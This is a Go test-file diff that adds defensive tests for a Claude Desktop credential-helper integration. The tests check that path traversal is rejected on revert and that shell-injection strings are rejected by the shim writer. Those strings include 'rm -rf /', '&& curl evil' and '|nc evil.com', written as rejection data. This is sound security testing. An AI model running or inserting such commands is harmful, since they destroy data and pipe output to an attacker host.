@@ -24,7 +24,7 @@ func newClaudeDesktopManager(t *testing.T) (*ClientManager, string) {
 	cm := NewTestClientManager(home, nil, supportedClientIntegrations, nil)
 	cfg := cm.lookupClientAppConfig(ClientApp(ClaudeDesktop))
 	require.NotNil(t, cfg, "ClaudeDesktop must be a supported integration")
-	require.Equal(t, credentialHelperMode, cfg.LLMGatewayMode, "ClaudeDesktop must use the credential-helper model")
+	require.Equal(t, llmgateway.ModeCredentialHelper, cfg.LLMGatewayMode, "ClaudeDesktop must use the credential-helper model")
 	return cm, cm.buildLLMSettingsPath(cfg)
 }
 
@@ -239,6 +239,70 @@ func TestRevertCredentialHelper_LeavesForeignAppliedIDIntact(t *testing.T) {
 	assert.Equal(t, "user-config", meta["appliedId"])
 	assert.Len(t, metaEntries(meta), 1)
 	assert.Equal(t, "user-config", metaEntryID(meta, "My Bedrock"))
+}
+
+// TestRevertCredentialHelper_RejectsUnsafeConfigPath proves the revert-side
+// guards refuse to unlink through a tampered stored configPath (os.Remove
+// follows symlinks). A stored path outside configLibrary — or one with a
+// traversal segment — must be treated as already-reverted, not deleted.
+// Each case gets its own sentinel file so subtests run in parallel safely.
+func TestRevertCredentialHelper_RejectsUnsafeConfigPath(t *testing.T) {
+	t.Parallel()
+	cm, _ := newClaudeDesktopManager(t)
+	// configLibrary must exist so revert reaches the guard rather than
+	// early-returning on a missing dir.
+	require.NoError(t, os.MkdirAll(
+		filepath.Join(cm.homeDir, "Library", "Application Support", "Claude-3p", "configLibrary"), 0o700))
+
+	cases := []struct {
+		name   string
+		stored string
+	}{
+		{"absolute path outside configLibrary", filepath.Join(t.TempDir(), "do-not-delete.txt")},
+		{"traversal segment", filepath.Join(cm.homeDir, "..", "evil.json")},
+		{"deeper traversal", filepath.Join(cm.homeDir, "..", "..", "evil.json")},
+	}
+	for _, tc := range cases {
+		tc := tc
+		// Each subtest owns its own sentinel so parallelism is safe.
+		require.NoError(t, os.WriteFile(tc.stored, []byte("sentinel"), 0o600))
+		t.Run(tc.name, func(t *testing.T) {
+			t.Parallel()
+			require.NoError(t, cm.RevertLLMGateway(ClientApp(ClaudeDesktop), tc.stored))
+			assert.FileExists(t, tc.stored, "teardown must not unlink a tampered configPath")
+		})
+	}
+}
+
+// TestWriteCredentialHelperShim_RejectsUnsafeCommand proves the shim writer
+// fails closed on any tokenHelperCommand it cannot prove is shell-safe, rather
+// than emitting an injectable 0700 /bin/sh script. buildTokenHelperCommand is
+// shell-safe today; this guards against a future caller that isn't.
+func TestWriteCredentialHelperShim_RejectsUnsafeCommand(t *testing.T) {
+	t.Parallel()
+	cm := &ClientManager{homeDir: t.TempDir()}
+
+	unsafe := []string{
+		`"thv" llm token; rm -rf /`,           // trailing command via ;
+		`"thv" llm token #`,                   // trailing comment
+		`"thv" llm token && curl evil`,        // chained command
+		`"thv" llm token|nc evil.com`,         // pipe to external process
+		`"thv" llm token` + "\n" + `rm -rf /`, // embedded newline
+		`unquoted path llm token`,             // missing leading double-quote
+		`"thv" llm tokn`,                      // wrong suffix (not " llm token")
+	}
+	for _, cmd := range unsafe {
+		t.Run(cmd, func(t *testing.T) {
+			t.Parallel()
+			_, err := cm.writeCredentialHelperShim(cmd)
+			require.Error(t, err, "expected rejection of %q", cmd)
+			assert.Contains(t, err.Error(), "shell-safe")
+		})
+	}
+
+	// The shape buildTokenHelperCommand actually produces is accepted.
+	_, err := cm.writeCredentialHelperShim(`"/bin/thv" llm token`)
+	require.NoError(t, err)
 }
 
 func TestConfigureCredentialHelper_CleansUpOnWriteFailure(t *testing.T) {
